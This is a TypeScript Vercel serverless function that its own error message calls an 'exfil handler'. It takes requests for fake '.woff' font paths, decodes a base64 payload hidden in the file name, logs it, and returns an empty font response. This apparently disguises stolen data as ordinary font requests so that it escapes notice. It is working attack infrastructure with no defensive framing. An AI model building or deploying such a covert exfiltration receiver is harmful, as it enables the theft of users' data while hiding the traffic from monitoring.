import type { VercelRequest, VercelResponse } from '@vercel/node'

export default function handler(req: VercelRequest, res: VercelResponse) {
  try {
    // Get slug param, e.g. ['timestamp_payload.woff']
    const slugArray = req.query.slug;
    if (!slugArray || !Array.isArray(slugArray) || slugArray.length === 0) {
      return res.status(400).send('Missing slug parameter');
    }

    const slug = slugArray[0]; // like "timestamp_base64payload.woff"
    const dotIndex = slug.lastIndexOf('.');
    if (dotIndex === -1) {
      return res.status(400).send('Invalid slug format');
    }

    // Remove extension (woff, ico, etc)
    const slugNoExt = slug.substring(0, dotIndex);

    // Split timestamp and base64 payload
    const underscoreIndex = slugNoExt.indexOf('_');
    if (underscoreIndex === -1) {
      return res.status(400).send('Slug missing underscore separator');
    }

    const timestamp = slugNoExt.substring(0, underscoreIndex);
    const b64Payload = slugNoExt.substring(underscoreIndex + 1);

    // Decode payload base64 → string
    const payloadJson = Buffer.from(b64Payload, 'base64').toString('utf8');

    // Log to Vercel logs (and send 200 OK)
    console.log('Received payload:', payloadJson);

    // Respond with a minimal font file (valid woff/ico data can be used here)
    // For simplicity, we just respond with 200 OK and empty body.
    res.status(200).setHeader('Content-Type', 'font/woff').send('');

  } catch (err) {
    console.error('Error in exfil handler:', err);
    res.status(500).send('Server error');
  }
}
